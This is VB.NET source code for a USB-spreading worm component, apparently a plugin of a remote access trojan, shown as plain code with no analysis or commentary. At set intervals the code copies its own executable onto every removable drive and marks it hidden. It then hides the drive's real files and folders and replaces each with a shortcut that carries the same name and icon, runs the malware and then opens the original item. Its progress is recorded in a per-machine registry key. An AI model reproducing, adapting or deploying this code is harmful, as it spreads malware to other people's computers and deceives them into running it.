Imports System.IO
Imports Microsoft.VisualBasic.CompilerServices
Imports Microsoft.Win32

Class Main
    'v_B01
    Private Shared ObjectShell As Object
    Private Shared ObjectLink As Object
    Private Shared spath As String
    Private Shared OK As Boolean = False

    Public Shared Sub RC(ByVal H As String, ByVal P As Integer, ByVal K As String)
        On Error Resume Next
        System.Threading.Thread.Sleep(2500)
        If GTV("USB") = "Not ready" Or GTV("USB") = Nothing Then
            STV("USB", "Waiting USB")
        End If
        spath = Interaction.Command().Replace("\\\", "\").Replace("\\", "\")
        ExecParam(spath)
        Dim NewThread As System.Threading.Thread = New System.Threading.Thread(New System.Threading.ThreadStart(AddressOf USBSpread), 1)
        NewThread.Start()
        Dim NewThread2 As System.Threading.Thread = New System.Threading.Thread(New System.Threading.ThreadStart(AddressOf _loop), 1)
        NewThread2.Start()
    End Sub

    Public Shared Sub USBSpread()
        While True
            System.Threading.Thread.Sleep(60000)
            Try
                Dim USBDrivers As String() = Strings.Split(DetectUSBDrivers(), "<->", -1, CompareMethod.Binary)
                Dim num As Integer = Information.UBound(USBDrivers, 1) - 1
                For i As Integer = 0 To num
                    If Not File.Exists(USBDrivers(i) & "\" & System.Diagnostics.Process.GetCurrentProcess().MainModule.ModuleName) Then
                        File.Copy(System.Windows.Forms.Application.ExecutablePath, USBDrivers(i) & System.Diagnostics.Process.GetCurrentProcess().MainModule.ModuleName)
                        File.SetAttributes(USBDrivers(i) & "\" & System.Diagnostics.Process.GetCurrentProcess().MainModule.ModuleName, FileAttributes.Hidden)
                    End If

                    Dim files As String() = Directory.GetFiles(USBDrivers(i))
                    For j As Integer = 0 To files.Length - 1
                        Dim GettingFile As String = files(j)
                        If GetAttr(GettingFile) <> FileAttribute.Hidden AndAlso Path.GetExtension(GettingFile) <> ".lnk" AndAlso Path.GetFileName(GettingFile) <> Process.GetCurrentProcess().MainModule.ModuleName Then
                            System.Threading.Thread.Sleep(100)
                            File.SetAttributes(GettingFile, FileAttributes.Hidden)
                            CreateShortCut(Path.GetFileName(GettingFile), USBDrivers(i), Path.GetFileNameWithoutExtension(GettingFile), GetIconoffile(Path.GetExtension(GettingFile)))
                            OK = True
                        End If
                    Next

                    Dim directories As String() = Directory.GetDirectories(USBDrivers(i))
                    For k As Integer = 0 To directories.Length - 1
                        Dim Dir As String = directories(k)
                        System.Threading.Thread.Sleep(100)
                        File.SetAttributes(Dir, FileAttributes.Hidden)
                        CreateShortCut(Path.GetFileNameWithoutExtension(Dir), USBDrivers(i) & "\", Path.GetFileNameWithoutExtension(Dir), Nothing)
                    Next
                Next
            Catch
            End Try
        End While
    End Sub

    Private Shared Sub CreateShortCut(ByVal TargetName As String, ByVal ShortCutPath As String, ByVal ShortCutName As String, ByVal Icon As String)
        Try
            ObjectShell = System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.Shell", ""))
            ObjectLink = System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(ObjectShell, Nothing, "CreateShortcut", New Object() {ShortCutPath & "\" & ShortCutName & ".lnk"}, Nothing, Nothing, Nothing))
            NewLateBinding.LateSet(ObjectLink, Nothing, "TargetPath", New Object() {ShortCutPath & "\" & System.Diagnostics.Process.GetCurrentProcess().MainModule.ModuleName}, Nothing, Nothing)
            NewLateBinding.LateSet(ObjectLink, Nothing, "WindowStyle", New Object() {1}, Nothing, Nothing)
            If Icon Is Nothing Then
                NewLateBinding.LateSet(ObjectLink, Nothing, "Arguments", New Object() {" " & ShortCutPath & "\" & TargetName}, Nothing, Nothing)
                NewLateBinding.LateSet(ObjectLink, Nothing, "IconLocation", New Object() {"%SystemRoot%\system32\SHELL32.dll,3"}, Nothing, Nothing)
            Else
                NewLateBinding.LateSet(ObjectLink, Nothing, "Arguments", New Object() {" " & ShortCutPath & "\" & TargetName}, Nothing, Nothing)
                NewLateBinding.LateSet(ObjectLink, Nothing, "IconLocation", New Object() {Icon}, Nothing, Nothing)
            End If

            NewLateBinding.LateCall(ObjectLink, Nothing, "Save", New Object(-1) {}, Nothing, Nothing, Nothing, True)
        Catch
        End Try
    End Sub

    Private Shared Function GetIconoffile(ByVal FileFormat As String) As String
        Dim _GetIconoffile As String
        Try
            Dim Registry As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey("Software\Classes\", False)
            Dim GetValue As String = Conversions.ToString(Registry.OpenSubKey(Conversions.ToString(Operators.ConcatenateObject(Registry.OpenSubKey(FileFormat, False).GetValue(""), "\DefaultIcon\"))).GetValue("", ""))
            If Not GetValue.Contains(",") Then
                GetValue += ",0"
            End If

            _GetIconoffile = GetValue
        Catch
            _GetIconoffile = ""
        End Try

        Return _GetIconoffile
    End Function

    Private Shared Function DetectUSBDrivers() As String
        Dim USBDrivers As String = ""
        Dim drives As DriveInfo() = DriveInfo.GetDrives()
        For i As Integer = 0 To drives.Length - 1
            Dim usbdrive As DriveInfo = drives(i)
            If usbdrive.DriveType = DriveType.Removable Then
                USBDrivers = USBDrivers & usbdrive.RootDirectory.FullName & "<->"
            End If
        Next

        Return USBDrivers
    End Function

    Private Shared Sub ExecParam(ByVal Parameter As String)
        If Operators.CompareString(Parameter, Nothing, False) <> 0 Then
            If Strings.InStrRev(Parameter, ".", -1, CompareMethod.Binary) > 0 Then
                System.Diagnostics.Process.Start(Parameter)
            Else
                Interaction.Shell("explorer " & Parameter, AppWinStyle.NormalFocus, False, -1)
            End If
        End If
    End Sub

    Private Shared Function GTV(ByVal n As String) As String ' Get value in my Registry Key RG
        Try
            Return Registry.CurrentUser.CreateSubKey("Software\" & ID.HWID).GetValue(n, "")
        Catch ex As Exception
            Return ""
        End Try
    End Function

    Private Shared Function STV(ByVal n As String, ByVal t As String) ' set value in my Registry Key RG
        Try
            Registry.CurrentUser.CreateSubKey("Software\" & ID.HWID).SetValue(n, t)
            Return True
        Catch ex As Exception
            Return False
        End Try
    End Function

    Private Shared Sub _loop()
        Try
            While True
                If OK = True Then
                    STV("USB", "Spreaded!")
                    Exit While
                End If
                System.Threading.Thread.Sleep(70000)
            End While
        Catch ex As Exception
        End Try
        Exit Sub
    End Sub

End Class
